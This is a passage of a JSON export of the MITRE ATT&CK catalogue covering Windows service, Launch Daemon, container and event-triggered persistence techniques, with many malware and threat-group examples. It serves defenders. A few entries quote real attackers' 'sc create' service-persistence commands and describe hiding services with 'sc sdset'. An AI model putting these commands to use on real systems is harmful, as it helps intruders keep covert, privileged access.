\"Bring Your Own Vulnerable Driver\" (BYOVD)) as part of Exploitation for Privilege Escalation.\nServices may be created with administrator privileges but are executed under SYSTEM privileges, so an adversary may also use a service to escalate privileges. Adversaries may also directly start services through Service Execution.\nTo make detection analysis more challenging, malicious services may also incorporate Masquerade Task or Service (ex: using a service and/or payload name related to a legitimate OS or benign software component). Adversaries may also create \u2018hidden\u2019 services (i.e., Hide Artifacts), for example by using the sc sdset command to set service permissions via the Service Descriptor Definition Language (SDDL). This may hide a Windows service from the view of standard service enumeration methods such as Get-Service, sc query, and services.exe.", "id": "T1543.003", "examples": [{"id": "C0025", "name": "2016 Ukraine Electric Power Attack", "description": "During the 2016 Ukraine Electric Power Attack, Sandworm Team used an arbitrary system service to load at system boot for persistence for Industroyer. They also replaced the ImagePath registry value of a Windows service with a new backdoor binary. "}, {"id": "G1030", "name": "Agrius", "description": "Agrius has deployed IPsec Helper malware post-exploitation and registered it as a service for persistence."}, {"id": "S0504", "name": "Anchor", "description": "Anchor can establish persistence by creating a service."}, {"id": "S0584", "name": "AppleJeus", "description": "AppleJeus can install itself as a service."}, {"id": "G0073", "name": "APT19", "description": "An APT19 Port 22 malware variant registers itself as a service."}, {"id": "G0022", "name": "APT3", "description": "APT3 has a tool that creates a new service for persistence."}, {"id": "G0050", "name": "APT32", "description": "APT32 modified Windows Services to ensure PowerShell scripts were loaded on the system. APT32 also creates a Windows service to establish persistence."}, {"id": "G0082", "name": "APT38", "description": "APT38 has installed a new Windows service to establish persistence."}, {"id": "G0096", "name": "APT41", "description": "APT41 modified legitimate Windows services to install malware backdoors. APT41 created the StorSyncSvc service to provide persistence for Cobalt Strike."}, {"id": "C0040", "name": "APT41 DUST", "description": "APT41 DUST used Windows Services with names such as Windows Defend for persistence of DUSTPAN."}, {"id": "G0143", "name": "Aquatic Panda", "description": "Aquatic Panda created new Windows services for persistence that masqueraded as legitimate Windows services via name change."}, {"id": "S0438", "name": "Attor", "description": "Attor's dispatcher can establish persistence by registering a new service."}, {"id": "S0347", "name": "AuditCred", "description": "AuditCred is installed as a new service on the system."}, {"id": "S0239", "name": "Bankshot", "description": "Bankshot can terminate a specific process by its process id."}, {"id": "S0127", "name": "BBSRAT", "description": "BBSRAT can modify service configurations."}, {"id": "S0268", "name": "Bisonal", "description": "Bisonal has been modified to be used as a Windows service."}, {"id": "S0570", "name": "BitPaymer", "description": "BitPaymer has attempted to install itself as a service to maintain persistence."}, {"id": "S1070", "name": "Black Basta", "description": "Black Basta can create a new service to establish persistence."}, {"id": "S0089", "name": "BlackEnergy", "description": "One variant of BlackEnergy creates a new service using either a hard-coded or randomly generated name."}, {"id": "G0108", "name": "Blue Mockingbird", "description": "Blue Mockingbird has made their XMRIG payloads persistent as a Windows Service."}, {"id": "S0204", "name": "Briba", "description": "Briba installs a service pointing to a malicious DLL dropped to disk."}, {"id": "G0008", "name": "Carbanak", "description": "Carbanak malware installs itself as a service to provide persistence and SYSTEM privileges."}, {"id": "S0335", "name": "Carbon", "description": "Carbon establishes persistence by creating a service and naming it based off the operating system version running on the current machine."}, {"id": "S0261", "name": "Catchamas", "description": "Catchamas adds a new service named NetAdapter to establish persistence."}, {"id": "G1021", "name": "Cinnamon Tempest", "description": "Cinnamon Tempest has created system services to establish persistence for deployed tooling."}, {"id": "S0660", "name": "Clambling", "description": "Clambling can register itself as a system service to gain persistence."}, {"id": "G0080", "name": "Cobalt Group", "description": "Cobalt Group has created new services to establish persistence."}, {"id": "S0154", "name": "Cobalt Strike", "description": "Cobalt Strike can install a new service."}, {"id": "S0608", "name": "Conficker", "description": "Conficker copies itself into the %systemroot%\\system32 directory and registers as a service."}, {"id": "S0050", "name": "CosmicDuke", "description": "CosmicDuke uses Windows services typically named \"javamtsup\" for persistence."}, {"id": "S0046", "name": "CozyCar", "description": "One persistence mechanism used by CozyCar is to register itself as a Windows service."}, {"id": "S0625", "name": "Cuba", "description": "Cuba can modify services by using the OpenService and ChangeServiceConfig functions."}, {"id": "G0105", "name": "DarkVishnya", "description": "DarkVishnya created new services for shellcode loaders distribution."}, {"id": "S1033", "name": "DCSrv", "description": "DCSrv has created new services for persistence by modifying the Registry."}, {"id": "S0567", "name": "Dtrack", "description": "Dtrack can add a service called WBService to establish persistence."}, {"id": "S0038", "name": "Duqu", "description": "Duqu creates a new service that loads a malicious driver when the system starts. When Duqu is active, the operating system believes that the driver is legitimate, as it has been signed with a valid private key."}, {"id": "S1158", "name": "DUSTPAN", "description": "DUSTPAN can persist as a Windows Service in operations."}, {"id": "S0024", "name": "Dyre", "description": "Dyre registers itself as a service by adding several Registry keys."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca created a service using the command sc create \"SysUpdate\" binpath= \"cmd /c start \"[file path]\"\"&&sc config \"SysUpdate\" start= auto&&netstart SysUpdate for persistence."}, {"id": "S0081", "name": "Elise", "description": "Elise configures itself as a service."}, {"id": "S0082", "name": "Emissary", "description": "Emissary is capable of configuring itself as a service."}, {"id": "S0367", "name": "Emotet", "description": "Emotet has been observed creating new services to maintain persistence."}, {"id": "S0363", "name": "Empire", "description": "Empire can utilize built-in modules to modify service binaries and restore them to their original state."}, {"id": "S0343", "name": "Exaramel for Windows", "description": "The Exaramel for Windows dropper creates and starts a Windows service named wsmprovav with the description \"Windows Check AV.\""}, {"id": "S0181", "name": "FALLCHILL", "description": "FALLCHILL has been installed as a Windows service."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 created new Windows services and added them to the startup directories for persistence."}, {"id": "S0182", "name": "FinFisher", "description": "FinFisher creates a new Windows service with the malicious executable for persistence."}, {"id": "S1044", "name": "FunnyDream", "description": "FunnyDream has established persistence by running sc.exe and by setting the WSearch service to run automatically."}, {"id": "S0666", "name": "Gelsemium", "description": "Gelsemium can drop itself in C:\\Windows\\System32\\spool\\prtprocs\\x64\\winprint.dll as an alternative Print Processor to be loaded automatically when the spoolsv Windows service starts."}, {"id": "S0032", "name": "gh0st RAT", "description": "gh0st RAT can create a new service to establish persistence."}, {"id": "S0493", "name": "GoldenSpy", "description": "GoldenSpy has established persistence by running in the background as an autostart service."}, {"id": "S0342", "name": "GreyEnergy", "description": "GreyEnergy chooses a service, drops a DLL file, and writes it to that serviceDLL Registry key."}, {"id": "S0071", "name": "hcdLoader", "description": "hcdLoader installs itself as a service for persistence."}, {"id": "S0697", "name": "HermeticWiper", "description": "HermeticWiper can load drivers by creating a new service using the CreateServiceW API."}, {"id": "S0203", "name": "Hydraq", "description": "Hydraq creates new services to establish persistence."}, {"id": "S0604", "name": "Industroyer", "description": "Industroyer can use an arbitrary system service to load at system boot for persistence and replaces the ImagePath registry value of a Windows service with a new backdoor binary."}, {"id": "S0259", "name": "InnaputRAT", "description": "Some InnaputRAT variants create a new Windows service to establish persistence."}, {"id": "S0260", "name": "InvisiMole", "description": "InvisiMole can register a Windows service named CsPower as part of its execution chain, and a Windows service named clr_optimization_v2.0.51527_X86 to achieve persistence."}, {"id": "S0044", "name": "JHUHUGIT", "description": "JHUHUGIT has registered itself as a service to establish persistence."}, {"id": "S0265", "name": "Kazuar", "description": "Kazuar can install itself as a new service."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang backdoor RoyalDNS established persistence through adding a service called Nwsapagent."}, {"id": "S0387", "name": "KeyBoy", "description": "KeyBoy installs a service pointing to a malicious DLL dropped to disk."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has created new services for persistence."}, {"id": "S0356", "name": "KONNI", "description": "KONNI has registered itself as a service using its export function."}, {"id": "S0236", "name": "Kwampirs", "description": "Kwampirs creates a new service named WmiApSrvEx to establish persistence."}, {"id": "G0032", "name": "Lazarus Group", "description": "Several Lazarus Group malware families install themselves as new services."}, {"id": "S0451", "name": "LoudMiner", "description": "LoudMiner can automatically launch a Linux virtual machine as a service at startup if the AutoStart option is enabled in the VBoxVmService configuration file."}, {"id": "S0149", "name": "MoonWind", "description": "MoonWind installs itself as a new service with automatic startup to establish persistence. The service checks every 60 seconds to determine if the malware is running; if not, it will spawn a new instance."}, {"id": "S0205", "name": "Naid", "description": "Naid creates a new service to establish."}, {"id": "S0630", "name": "Nebulae", "description": "Nebulae can create a service to establish persistence."}, {"id": "S0210", "name": "Nerex", "description": "Nerex creates a Registry subkey that registers a new service."}, {"id": "S0118", "name": "Nidiran", "description": "Nidiran can create a new service named msamger (Microsoft Security Accounts Manager)."}, {"id": "S1090", "name": "NightClub", "description": "NightClub has created a Windows service named WmdmPmSp to establish persistence."}, {"id": "S1100", "name": "Ninja", "description": "Ninja can create the services httpsvc and w3esvc for persistence ."}, {"id": "S0439", "name": "Okrum", "description": "To establish persistence, Okrum can install itself as a new service named NtmSsvc."}, {"id": "C0012", "name": "Operation CuckooBees", "description": "During Operation CuckooBees, the threat actors modified the IKEEXT and PrintNotify Windows services for persistence."}, {"id": "C0006", "name": "Operation Honeybee", "description": "During Operation Honeybee, threat actors installed DLLs and backdoors as Windows services."}, {"id": "S0664", "name": "Pandora", "description": "Pandora has the ability to gain system privileges through Windows services."}, {"id": "S1031", "name": "PingPull", "description": "PingPull has the ability to install itself as a service."}, {"id": "S0501", "name": "PipeMon", "description": "PipeMon can establish persistence by registering a malicious DLL as an alternative Print Processor which is loaded when the print spooler service starts."}, {"id": "S0013", "name": "PlugX", "description": "PlugX can be added as a service to establish persistence. PlugX also has a module to change service configurations as well as start, control, and delete services."}, {"id": "S0012", "name": "PoisonIvy", "description": "PoisonIvy creates a Registry subkey that registers a new service. PoisonIvy also creates a Registry entry modifying the Logical Disk Manager service to point to a malicious DLL dropped to disk."}, {"id": "S0194", "name": "PowerSploit", "description": "PowerSploit contains a collection of Privesc-PowerUp modules that can discover and replace/modify service binaries, paths, and configs."}, {"id": "G0056", "name": "PROMETHIUM", "description": "PROMETHIUM has created new services and modified existing services for persistence."}, {"id": "S0029", "name": "PsExec", "description": "PsExec can leverage Windows services to escalate privileges from administrator to SYSTEM with the -s argument."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can remotely create a temporary service on a target host."}, {"id": "S0481", "name": "Ragnar Locker", "description": "Ragnar Locker has used sc.exe to create a new service for the VirtualBox driver."}, {"id": "S0629", "name": "RainyDay", "description": "RainyDay can use services to establish persistence."}, {"id": "S0169", "name": "RawPOS", "description": "RawPOS installs itself as a service to maintain persistence."}, {"id": "S0495", "name": "RDAT", "description": "RDAT has created a service when it is installed on the victim machine."}, {"id": "S0172", "name": "Reaver", "description": "Reaver installs itself as a new service."}, {"id": "S0074", "name": "Sakula", "description": "Some Sakula samples install themselves as services for persistence by calling WinExec with the net start argument."}, {"id": "S1099", "name": "Samurai", "description": "Samurai can create a service at HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SvcHost to trigger execution and maintain persistence."}, {"id": "S0345", "name": "Seasalt", "description": "Seasalt is capable of installing itself as a service."}, {"id": "S0140", "name": "Shamoon", "description": "Shamoon creates a new service named \"ntssrv\" to execute the payload. Newer versions create the \"MaintenaceSrv\" and \"hdv_725x\" services."}, {"id": "S0444", "name": "ShimRat", "description": "ShimRat has installed a Windows service to maintain persistence on victim machines."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can establish persistence by creating a new service."}, {"id": "S0533", "name": "SLOTHFULMEDIA", "description": "SLOTHFULMEDIA has created a service on victim machines named \"TaskFrame\" to establish persistence."}, {"id": "S1037", "name": "STARWHALE", "description": "STARWHALE has the ability to create the following Windows service to establish persistence on an infected host: sc create Windowscarpstss binpath= \"cmd.exe /c cscript.exe c:\\\\windows\\\\system32\\\\w7_1.wsf humpback_whale\" start= \"auto\" obj= \"LocalSystem\"."}, {"id": "S0142", "name": "StreamEx", "description": "StreamEx establishes persistence by installing a new service pointing to its DLL and setting the service to auto-start."}, {"id": "S0491", "name": "StrongPity", "description": "StrongPity has created new services and modified existing services for persistence."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet uses a driver registered as a boot start service as the main load-point."}, {"id": "S1049", "name": "SUGARUSH", "description": "SUGARUSH has created a service named Service1 for persistence."}, {"id": "S0663", "name": "SysUpdate", "description": "SysUpdate can create a service to establish persistence."}, {"id": "S0164", "name": "TDTESS", "description": "If running as administrator, TDTESS installs itself as a new service named bmwappushservice to establish persistence."}, {"id": "G0139", "name": "TeamTNT", "description": "TeamTNT has used malware that adds cryptocurrency miners as a service."}, {"id": "S0560", "name": "TEARDROP", "description": "TEARDROP ran as a Windows service from the c:\\windows\\syswow64 folder."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390's malware can create a new service, sometimes naming it after the config information, to gain persistence."}, {"id": "S0665", "name": "ThreatNeedle", "description": "ThreatNeedle can run in memory and register its payload as a Windows service."}, {"id": "S0004", "name": "TinyZBot", "description": "TinyZBot can install as a Windows service for persistence."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot establishes persistence by creating an autostart service that allows it to run whenever the machine boots."}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper has installed a service pointing to a malicious DLL dropped to disk."}, {"id": "S0263", "name": "TYPEFRAME", "description": "TYPEFRAME variants can add malicious DLL modules as new services.TYPEFRAME can also delete services from the victim\u2019s machine."}, {"id": "S0022", "name": "Uroburos", "description": "Uroburos has registered a service, typically named WerFaultSvc, to decrypt and find a kernel driver and kernel driver loader to maintain persistence."}, {"id": "S0386", "name": "Ursnif", "description": "Ursnif has registered itself as a system service in the Registry for automatic execution at system startup."}, {"id": "S0180", "name": "Volgmer", "description": "Volgmer installs a copy of itself in a randomly selected service, then overwrites the ServiceDLL entry in the service's Registry entry. Some Volgmer variants also install .dll files as services with names generated by a list of hard-coded strings."}, {"id": "S0366", "name": "WannaCry", "description": "WannaCry creates the service \"mssecsvc2.0\" with the display name \"Microsoft Security Center (2.0) Service.\""}, {"id": "S0612", "name": "WastedLocker", "description": "WastedLocker created and established a service that runs until the encryption process is complete."}, {"id": "S0206", "name": "Wiarp", "description": "Wiarp creates a backdoor through which remote attackers can create a service."}, {"id": "S0176", "name": "Wingbird", "description": "Wingbird uses services.exe to register a new autostart service named \"Audit Service\" using a copy of the local lsass.exe file."}, {"id": "S0141", "name": "Winnti for Windows", "description": "Winnti for Windows sets its DLL file as a new service in the Registry to establish persistence."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has installed TrickBot as a service named ControlServiceA in order to establish persistence."}, {"id": "S0230", "name": "ZeroT", "description": "ZeroT can add a new service to ensure PlugX persists on the system when delivered as another payload onto the system."}, {"id": "S0086", "name": "ZLib", "description": "ZLib creates Registry keys to allow itself to run as various services."}, {"id": "S0350", "name": "zwShell", "description": "zwShell has established persistence by adding itself as a new service."}, {"id": "S0412", "name": "ZxShell", "description": "ZxShell can create a new service using the service parser function ProcessScCommand."}]}, {"name": "Launch Daemon", "description": "Adversaries may create or modify Launch Daemons to execute malicious payloads as part of persistence. Launch Daemons are plist files used to interact with Launchd, the service management framework used by macOS. Launch Daemons require elevated privileges to install, are executed for every user on a system prior to login, and run in the background without the need for user interaction. During the macOS initialization startup, the launchd process loads the parameters for launch-on-demand system-level daemons from plist files found in /System/Library/LaunchDaemons/ and /Library/LaunchDaemons/. Required Launch Daemons parameters include a Label to identify the task, Program to provide a path to the executable, and RunAtLoad to specify when the task is run. Launch Daemons are often used to provide access to shared resources, updates to software, or conduct automation tasks.", "detailed_description": "Adversaries may create or modify Launch Daemons to execute malicious payloads as part of persistence. Launch Daemons are plist files used to interact with Launchd, the service management framework used by macOS. Launch Daemons require elevated privileges to install, are executed for every user on a system prior to login, and run in the background without the need for user interaction. During the macOS initialization startup, the launchd process loads the parameters for launch-on-demand system-level daemons from plist files found in /System/Library/LaunchDaemons/ and /Library/LaunchDaemons/. Required Launch Daemons parameters include a Label to identify the task, Program to provide a path to the executable, and RunAtLoad to specify when the task is run. Launch Daemons are often used to provide access to shared resources, updates to software, or conduct automation tasks.\nAdversaries may install a Launch Daemon configured to execute at startup by using the RunAtLoad parameter set to true and the Program parameter set to the malicious executable path. The daemon name may be disguised by using a name from a related operating system or benign software (i.e. Masquerading). When the Launch Daemon is executed, the program inherits administrative permissions.\nAdditionally, system configuration changes (such as the installation of third party package managing software) may cause folders such as usr/local/bin to become globally writeable. So, it is possible for poor configurations to allow an adversary to modify executables referenced by current Launch Daemon's plist files.", "id": "T1543.004", "examples": [{"id": "S0584", "name": "AppleJeus", "description": "AppleJeus has placed a plist file within the LaunchDaemons folder and launched it manually."}, {"id": "S0482", "name": "Bundlore", "description": "Bundlore can persist via a LaunchDaemon."}, {"id": "S1105", "name": "COATHANGER", "description": "COATHANGER will create a daemon for timed check-ins with command and control infrastructure."}, {"id": "S0497", "name": "Dacls", "description": "Dacls can establish persistence via a Launch Daemon."}, {"id": "S0690", "name": "Green Lambert", "description": "Green Lambert can add a plist file in the Library/LaunchDaemons to establish persistence."}, {"id": "S0451", "name": "LoudMiner", "description": "LoudMiner adds plist files with the naming format com.[random_name].plist in the /Library/LaunchDaemons folder with the RunAtLoad and KeepAlive keys set to true."}, {"id": "S0352", "name": "OSX_OCEANLOTUS.D", "description": "If running with root permissions, OSX_OCEANLOTUS.D can create a persistence file in the folder /Library/LaunchDaemons."}, {"id": "S0595", "name": "ThiefQuest", "description": "When running with root privileges after a Launch Agent is installed, ThiefQuest installs a plist file to the /Library/LaunchDaemons/ folder with the RunAtLoad key set to true establishing persistence as a Launch Daemon. "}, {"id": "S0658", "name": "XCSSET", "description": "XCSSET uses the ssh launchdaemon to elevate privileges, bypass system controls, and enable remote access to the victim."}]}, {"name": "Container Service", "description": "Adversaries may create or modify container or container cluster management tools that run as daemons, agents, or services on individual hosts. These include software for creating and managing individual containers, such as Docker and Podman, as well as container cluster node-level agents such as kubelet. By modifying these services, an adversary may be able to achieve persistence or escalate their privileges on a host.", "detailed_description": "Adversaries may create or modify container or container cluster management tools that run as daemons, agents, or services on individual hosts. These include software for creating and managing individual containers, such as Docker and Podman, as well as container cluster node-level agents such as kubelet. By modifying these services, an adversary may be able to achieve persistence or escalate their privileges on a host.\nFor example, by using the docker run or podman run command with the restart=always directive, a container can be configured to persistently restart on the host. A user with access to the (rootful) docker command may also be able to escalate their privileges on the host.\nIn Kubernetes environments, DaemonSets allow an adversary to persistently Deploy Containers on all nodes, including ones added later to the cluster. Pods can also be deployed to specific nodes using the nodeSelector or nodeName fields in the pod spec.\nNote that containers can also be configured to run as Systemd Services.", "id": "T1543.005", "examples": []}]}, {"name": "Event Triggered Execution", "description": "Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. Cloud environments may also support various functions and services that monitor and can be invoked in response to specific cloud events.", "detailed_description": "Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. Cloud environments may also support various functions and services that monitor and can be invoked in response to specific cloud events.\nAdversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.\nSince the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges.", "id": "T1546", "examples": [{"id": "C0035", "name": "KV Botnet Activity", "description": "KV Botnet Activity involves managing events on victim systems via libevent to execute a callback function when any running process contains the following references in their path without also having a reference to bioset: busybox, wget, curl, tftp, telnetd, or lua. If the bioset string is not found, the related process is terminated."}, {"id": "S1091", "name": "Pacu", "description": "Pacu can set up S3 bucket notifications to trigger a malicious Lambda function when a CloudFormation template is uploaded to the bucket. It can also create Lambda functions that trigger upon the creation of users, roles, and groups."}], "sub_techniques": [{"name": "Change Default File Association", "description": "Adversaries may establish persistence by executing malicious content triggered by a file type association. When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility. Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.", "detailed_description": "Adversaries may establish persistence by executing malicious content triggered by a file type association. When a file is opened, the default program used to open the file (also called the file association or handler) is checked. File association selections are stored in the Windows Registry and can be edited by users, administrators, or programs that have Registry access or by administrators using the built-in assoc utility. Applications can modify the file association for a given file extension to call an arbitrary program when a file with the given extension is opened.\nSystem file associations are listed under HKEY_CLASSES_ROOT.[extension], for example HKEY_CLASSES_ROOT.txt. The entries point to a handler for that extension located at HKEY_CLASSES_ROOT\\[handler]. The various commands are then listed as subkeys underneath the shell key at HKEY_CLASSES_ROOT\\[handler]\\shell\\[action]\\command. For example:\nThe values of the keys listed are commands that are executed when the handler opens the file extension. Adversaries can modify these values to continually execute arbitrary commands.", "id": "T1546.001", "examples": [{"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has a HWP document stealer module which changes the default program association in the registry to open HWP documents."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can conduct an image hijack of an .msc file extension as part of its UAC bypass process."}]}, {"name": "Screensaver", "description": "Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension. The Windows screensaver application scrnsave.scr is located in C:\\Windows\\System32\\, and C:\\Windows\\sysWOW64\\  on 64-bit Windows systems, along with screensavers included with base Windows installations.", "detailed_description": "Adversaries may establish persistence by executing malicious content triggered by user inactivity. Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension. The Windows screensaver application scrnsave.scr is located in C:\\Windows\\System32\\, and C:\\Windows\\sysWOW64\\  on 64-bit Windows systems, along with screensavers included with base Windows installations.\nThe following screensaver settings are stored in the Registry (HKCU\\Control Panel\\Desktop\\) and could be manipulated to achieve persistence:\nAdversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity.", "id": "T1546.002", "examples": [{"id": "S0168", "name": "Gazer", "description": "Gazer can establish persistence through the system screensaver by configuring it to execute the malware."}]}, {"name": "Windows Management Instrumentation Event Subscription", "description": "Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user login, or the computer's uptime.", "detailed_description": "Adversaries may establish persistence and elevate privileges by executing malicious content triggered by a Windows Management Instrumentation (WMI) event subscription. WMI can be used to install event filters, providers, consumers, and bindings that execute code when a defined event occurs. Examples of events that may be subscribed to are the wall clock time, user login, or the computer's uptime.\nAdversaries may use the capabilities of WMI to subscribe to an event and execute arbitrary code when that event occurs, providing persistence on a system. Adversaries may also compile WMI scripts \u2013 using mofcomp.exe  \u2013into Windows Management Object (MOF) files (.mof extension) that can be used to create a malicious subscription.\nWMI subscription execution is proxied by the WMI Provider Host process (WmiPrvSe.exe) and thus may result in elevated SYSTEM privileges.", "id": "T1546.003", "examples": [{"id": "S0202", "name": "adbupd", "description": "adbupd can use a WMI script to achieve persistence."}, {"id": "G0016", "name": "APT29", "description": "APT29 has used WMI event subscriptions for persistence."}, {"id": "G0064", "name": "APT33", "description": "APT33 has attempted to use WMI event subscriptions to establish persistence on compromised hosts."}, {"id": "S1081", "name": "BADHATCH", "description": "BADHATCH can use WMI event subscriptions for persistence."}, {"id": "G0108", "name": "Blue Mockingbird", "description": "Blue Mockingbird has used mofcomp.exe to establish WMI Event Subscription persistence mechanisms configured from a *.mof file."}, {"id": "G0061", "name": "FIN8", "description": "FIN8 has used WMI event subscriptions for persistence."}, {"id": "G1001", "name": "HEXANE", "description": "HEXANE has used WMI event subscriptions for persistence."}, {"id": "S0376", "name": "HOPLIGHT", "description": "HOPLIGHT can use WMI event subscriptions to create persistence."}, {"id": "S1020", "name": "Kevin", "description": "Kevin can compile randomly-generated MOF files into the WMI repository to persistently run malware."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has used WMI for persistence."}, {"id": "G1013", "name": "Metador", "description": "Metador has established persistence through the use of a WMI event subscription combined with unusual living-off-the-land binaries such as cdb.exe."}, {"id": "S1059", "name": "metaMain", "description": "metaMain registered a WMI event subscription consumer called \"hard_disk_stat\" to establish persistence."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda's custom ORat tool uses a WMI event consumer to maintain persistence."}, {"id": "C0023", "name": "Operation Ghost", "description": "During Operation Ghost, APT29 used WMI event subscriptions to establish persistence for malware."}, {"id": "S0378", "name": "PoshC2", "description": "PoshC2 has the ability to persist on a system using WMI events."}, {"id": "S0150", "name": "POSHSPY", "description": "POSHSPY uses a WMI event subscription to establish persistence."}, {"id": "S0371", "name": "POWERTON", "description": "POWERTON can use WMI for persistence."}, {"id": "G0075", "name": "Rancor", "description": "Rancor has complied VBScript-generated MOF files into WMI event subscriptions for persistence."}, {"id": "S0511", "name": "RegDuke", "description": "RegDuke can persist using a WMI consumer that is launched every time a process named WINWORD.EXE is started."}, {"id": "S1085", "name": "Sardonic", "description": "Sardonic can use a WMI event filter to invoke a command-line event consumer to gain persistence."}, {"id": "S0053", "name": "SeaDuke", "description": "SeaDuke uses an event filter in WMI code to execute a previously dropped executable shortly after system startup."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can create a WMI Event to execute a payload for persistence."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used a WMI event filter to invoke a command-line event consumer at system boot time to launch a backdoor with rundll32.exe."}, {"id": "S0682", "name": "TrailBlazer", "description": "TrailBlazer has the ability to use WMI for persistence."}, {"id": "G0010", "name": "Turla", "description": "Turla has used WMI event filters and consumers to establish persistence."}]}, {"name": "Unix Shell Configuration Modification", "description": "Adversaries may establish persistence through executing malicious commands triggered by a user\u2019s shell. User Unix Shells execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (/etc) and the user\u2019s home directory (~/) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user\u2019s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately.", "detailed_description": "Adversaries may establish persistence through executing malicious commands triggered by a user\u2019s shell. User Unix Shells execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (/etc) and the user\u2019s home directory (~/) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user\u2019s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately.\nAdversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the /etc/profile and /etc/profile.d files. These files typically require root permissions to modify and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into ~/.bash_profile, ~/.bash_login, or ~/.profile which are sourced when a user opens a command-line interface or connects remotely. Since the system only executes the first existing file in the listed order, adversaries have used ~/.bash_profile to ensure execution. Adversaries have also leveraged the ~/.bashrc file which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command-line interface. Some malware targets the termination of a program to trigger execution, adversaries can use the ~/.bash_logout file to execute malicious commands at the end of a session.\nFor macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using /etc/profile, /etc/zshenv, /etc/zprofile, and /etc/zlogin. The login shell then configures the user environment with ~/.zprofile and ~/.zlogin. The interactive shell uses the ~/.zshrc to configure the user environment. Upon exiting, /etc/zlogout and ~/.zlogout are executed. For legacy programs, macOS executes /etc/bashrc on startup.", "id": "T1546.004", "examples": [{"id": "S0690", "name": "Green Lambert", "description": "Green Lambert can establish persistence on a compromised host through modifying the profile, login, and run command (rc) files associated with the bash, csh, and tcsh shells. "}, {"id": "S0362", "name": "Linux Rabbit", "description": "Linux Rabbit maintains persistence on an infected machine through rc.local and .bashrc files. "}, {"id": "S1078", "name": "RotaJakiro", "description": "When executing with non-root level permissions, RotaJakiro can install persistence by adding a command to the .bashrc file that executes a binary in the  ${HOME}/.gvfsd/.profile/ folder."}]}, {"name": "Trap", "description": "Adversaries may establish persistence by executing malicious content triggered by an interrupt signal. The trap command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like ctrl+c and ctrl+d.", "detailed_description": "Adversaries may establish persistence by executing malicious content triggered by an interrupt signal. The trap command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like ctrl+c and ctrl+d.\nAdversaries can use this to register code to be executed when the shell encounters specific interrupts as a persistence mechanism. Trap commands are of the following format trap 'command list' signals where \"command list\" will be executed when \"signals\" are received.", "id": "T1546.005", "examples": []}, {"name": "LC_LOAD_DYLIB Addition", "description": "Adversaries may establish persistence by executing malicious content triggered by the execution of tainted binaries. Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long as adjustments are made to the rest of the fields and dependencies. There are tools available to perform these changes.", "detailed_description": "Adversaries may establish persistence by executing malicious content triggered by the execution of tainted binaries. Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as 